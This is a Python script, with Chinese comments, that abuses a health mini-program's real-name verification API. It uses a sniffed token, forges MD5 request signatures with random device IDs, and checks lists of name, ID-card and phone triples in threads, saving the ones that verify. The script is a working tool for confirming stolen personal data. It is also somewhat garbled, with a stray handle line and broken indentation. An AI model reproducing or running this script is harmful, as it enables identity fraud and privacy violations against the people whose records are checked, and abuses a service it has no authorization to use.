import requests
import threading
import time
import json
import hashlib
import random
import string

url = "https://wx.jnxls.net/MemberProfileWebService.asmx/SaveRealProfile"
file_lock = threading.Lock()
stop_threads = False

def generate_sign(devicenumber, data):
    sorted_data = sorted(data.items())
    data_str = '&'.join(f'{k}={v}' for k, v in sorted_data)
    data_str = devicenumber + data_str
    return hashlib.md5(data_str.encode('utf-8')).hexdigest().upper()

def generate_random_devicenumber(length=18):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def verify_info(name, id_card, phone, result_file):
    global stop_threads
    headers = {
        "Xweb_xhr": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090b19)XWEB/11065",
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "Accept": "*/*",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://servicewechat.com/wx5de780953ff8e77e/66/page-frame.html",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache"
    }

    data = {


        # 小程序 金鲵健康，实名认证，抓包替换realprofileid
        "realprofileid": "",


        "idcard": id_card,
        "fullname": name,
        "mobilephone": phone,
        "realprofiletype": 1,
        "authenticationtype": "2",
        "devicenumber": generate_random_devicenumber(),
        "versioncode": "1",
        "platform": "5",
        "time": time.strftime("%Y%m%d%H%M%S", time.localtime()),


        # 小程序 金鲵健康，实名认证，抓包替换token
        "token": "",


    }

    devicenumber = data["devicenumber"]
    data["sign"] = generate_sign(devicenumber, data)

    try:
        response = requests.post(url, headers=headers, data={
                                 "requestJson": json.dumps(data)})
        response.raise_for_status()
        result = response.json().get("result")
        message = response.json().get("message")
        if result == '0':
            result_str = f"{name}-{id_card}-{phone}-✅核验成功✅\n"
            print(f"{name}-{id_card}-{phone} ✅核验成功✅")
            stop_threads = True
            with file_lock:
                with open(result_file, 'a', encoding='utf-8') as f:
                    f.write(result_str)
        else:
            print(f"{id_card}-原因：{message}-🚫核验失败🚫")

    except requests.RequestException as e:
        print(f"请求失败: {e}")
    except Exception as e:
        print(f"发生错误: {e}")


def read_input_file(file_name, result_file):
    global stop_threads
    threads = []
    try:
        with open(file_name, 'r', encoding='utf-8') as input_file:
            for line in input_file:
                if stop_threads:
                    break
                info = line.strip().split("-")
                if len(info) == 3:                    t = threading.Thread(
                        target=verify_info, args=(*info, result_file))
                    t.start()
                    threads.append(t)

                    time.sleep(2) # 控制线程并发数(这里不能太快，不然反应不过来)

    except FileNotFoundError:
        print("文件未找到，请检查文件路径。")
    except Exception as e:
        print(f"读取文件时发生错误：{e}")

    for t in threads:
        t.join()
 @youxs1321

try:
    start_time = time.time()
input_file_name ="/sdcard/待三要素核验.txt"
output_file_name = "/sdcard/三要素核验结果.txt"    
    read_input_file(input_file_name, output_file_name)
except FileNotFoundError as e:
    print(f"文件未找到: {e}")
except ValueError as e:
    print(f"值错误发生: {e}")
except Exception as e:
    print(f"发生错误: {e}")

end_time = time.time()
elapsed_time = end_time - start_time
print(f"核验任务已完成，总耗时: {elapsed_time:.2f} 秒")
